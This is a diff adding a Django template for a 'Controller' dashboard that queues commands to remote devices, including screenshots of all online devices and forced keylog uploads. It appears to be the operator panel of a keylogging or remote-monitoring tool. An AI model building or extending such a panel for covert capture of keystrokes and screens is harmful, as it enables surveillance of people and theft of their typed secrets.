@@ -1,0 +1,233 @@
+{% extends 'base.html' %}
+
+{% block title %}Commands - Controller{% endblock %}
+{% block page_title %}Commands{% endblock %}
+
+{% block content %}
+<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+    <p style="color: var(--text-secondary); font-size: 14px;">
+        Manage and send commands to devices
+    </p>
+    <button class="btn btn-primary" onclick="openCommandModal()">
+        <i class="ph ph-plus"></i>
+        Send Command
+    </button>
+</div>
+
+<!-- Quick Command Buttons -->
+<div class="card fade-in" style="margin-bottom: 24px;">
+    <div class="card-header">
+        <h3 class="card-title">Quick Commands</h3>
+    </div>
+    <div class="card-body">
+        <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px;">
+            <button class="quick-cmd-btn" onclick="broadcastCommand('screenshot')" style="padding: 20px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-md); cursor: pointer; text-align: left; transition: all 0.2s;">
+                <i class="ph ph-camera" style="font-size: 24px; color: var(--info); margin-bottom: 8px; display: block;"></i>
+                <div style="font-size: 14px; font-weight: 500; color: var(--text-primary); margin-bottom: 4px;">Screenshot All</div>
+                <div style="font-size: 12px; color: var(--text-muted);">Capture all online devices</div>
+            </button>
+            <button class="quick-cmd-btn" onclick="broadcastCommand('keylog_sync')" style="padding: 20px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-md); cursor: pointer; text-align: left; transition: all 0.2s;">
+                <i class="ph ph-upload" style="font-size: 24px; color: var(--success); margin-bottom: 8px; display: block;"></i>
+                <div style="font-size: 14px; font-weight: 500; color: var(--text-primary); margin-bottom: 4px;">Sync Keylogs</div>
+                <div style="font-size: 12px; color: var(--text-muted);">Force keylog upload</div>
+            </button>
+            <button class="quick-cmd-btn" onclick="broadcastCommand('config_refresh')" style="padding: 20px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-md); cursor: pointer; text-align: left; transition: all 0.2s;">
+                <i class="ph ph-arrows-clockwise" style="font-size: 24px; color: var(--warning); margin-bottom: 8px; display: block;"></i>
+                <div style="font-size: 14px; font-weight: 500; color: var(--text-primary); margin-bottom: 4px;">Refresh Config</div>
+                <div style="font-size: 12px; color: var(--text-muted);">Push config updates</div>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Command Queue -->
+<div class="card fade-in">
+    <div class="card-header">
+        <h3 class="card-title">Command Queue</h3>
+        <div style="display: flex; gap: 8px;">
+            <select id="statusFilter" style="background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 6px 12px; color: var(--text-primary); font-size: 13px;" onchange="filterCommands()">
+                <option value="">All Status</option>
+                <option value="pending">Pending</option>
+                <option value="executed">Executed</option>
+                <option value="failed">Failed</option>
+            </select>
+        </div>
+    </div>
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>Device</th>
+                    <th>Command</th>
+                    <th>Status</th>
+                    <th>Created</th>
+                    <th>Executed</th>
+                    <th>Result</th>
+                </tr>
+            </thead>
+            <tbody id="commandTable">
+                {% for command in commands %}
+                <tr data-status="{{ command.status }}">
+                    <td>
+                        <a href="{% url 'device_detail' command.device.device_id %}" style="color: var(--accent-primary); text-decoration: none;">
+                            {{ command.device.hostname }}
+                        </a>
+                    </td>
+                    <td>
+                        <code style="background: var(--bg-tertiary); padding: 4px 8px; border-radius: var(--radius-sm);">{{ command.command_type }}</code>
+                    </td>
+                    <td>
+                        {% if command.status == 'pending' %}
+                        <span class="badge badge-warning">
+                            <span class="badge-dot pulse"></span>
+                            Pending
+                        </span>
+                        {% elif command.status == 'executed' %}
+                        <span class="badge badge-success">
+                            <span class="badge-dot"></span>
+                            Executed
+                        </span>
+                        {% elif command.status == 'failed' %}
+                        <span class="badge badge-danger">
+                            <span class="badge-dot"></span>
+                            Failed
+                        </span>
+                        {% endif %}
+                    </td>
+                    <td style="color: var(--text-secondary);">{{ command.created_at|timesince }} ago</td>
+                    <td style="color: var(--text-secondary);">{{ command.executed_at|default:"-" }}</td>
+                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; color: var(--text-muted);">
+                        {{ command.result|default:"-"|truncatechars:50 }}
+                    </td>
+                </tr>
+                {% empty %}
+                <tr>
+                    <td colspan="6">
+                        <div class="empty-state" style="padding: 60px 20px;">
+                            <i class="ph ph-terminal" style="font-size: 64px;"></i>
+                            <h3 style="margin-top: 16px;">No commands</h3>
+                            <p>Commands will appear here once sent.</p>
+                        </div>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- Command Modal -->
+<div id="commandModal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; padding: 20px;" onclick="if(event.target===this)closeCommandModal()">
+    <div style="max-width: 500px; margin: 100px auto; background: var(--bg-secondary); border-radius: var(--radius-lg); border: 1px solid var(--border-color);" onclick="event.stopPropagation()">
+        <div style="padding: 20px 24px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center;">
+            <h3 style="font-size: 18px; font-weight: 600;">Send Command</h3>
+            <button onclick="closeCommandModal()" style="background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 20px;">
+                <i class="ph ph-x"></i>
+            </button>
+        </div>
+        <div style="padding: 24px;">
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Device</label>
+                <select id="cmdDevice" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                    <option value="">All Online Devices</option>
+                    {% for device in devices %}
+                    <option value="{{ device.device_id }}">{{ device.hostname }}</option>
+                    {% endfor %}
+                </select>
+            </div>
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Command Type</label>
+                <select id="cmdType" style="width: 100%; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 12px; color: var(--text-primary); font-size: 14px;">
+                    <option value="screenshot">Screenshot</option>
+                    <option value="keylog_sync">Sync Keylogs</option>
+                    <option value="config_refresh">Refresh Config</option>
+                </select>
+            </div>
+            <div style="display: flex; gap: 12px; justify-content: flex-end;">
+                <button class="btn btn-secondary" onclick="closeCommandModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="sendCommandFromModal()">
+                    <i class="ph ph-paper-plane-tilt"></i>
+                    Send
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.quick-cmd-btn:hover {
+    background: var(--bg-hover) !important;
+    border-color: var(--accent-primary) !important;
+}
+</style>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function openCommandModal() {
+    document.getElementById('commandModal').style.display = 'block';
+    document.body.style.overflow = 'hidden';
+}
+
+function closeCommandModal() {
+    document.getElementById('commandModal').style.display = 'none';
+    document.body.style.overflow = '';
+}
+
+function sendCommandFromModal() {
+    const device = document.getElementById('cmdDevice').value;
+    const type = document.getElementById('cmdType').value;
+    
+    sendCommand(device, type);
+    closeCommandModal();
+}
+
+function broadcastCommand(type) {
+    if (confirm('Send "' + type + '" to all online devices?')) {
+        sendCommand('', type);
+    }
+}
+
+function sendCommand(deviceId, commandType) {
+    fetch('/api/commands/send/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': '{{ csrf_token }}'
+        },
+        body: JSON.stringify({
+            device_id: deviceId,
+            command_type: commandType,
+            payload: {}
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            alert('Error: ' + data.error);
+        } else {
+            alert('Command sent successfully!');
+            location.reload();
+        }
+    })
+    .catch(err => {
+        alert('Failed to send command');
+    });
+}
+
+function filterCommands() {
+    const status = document.getElementById('statusFilter').value;
+    document.querySelectorAll('#commandTable tr').forEach(row => {
+        if (!status || row.dataset.status === status) {
+            row.style.display = '';
+        } else {
+            row.style.display = 'none';
+        }
+    });
+}
+
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closeCommandModal();
+});
+</script>
+{% endblock %}
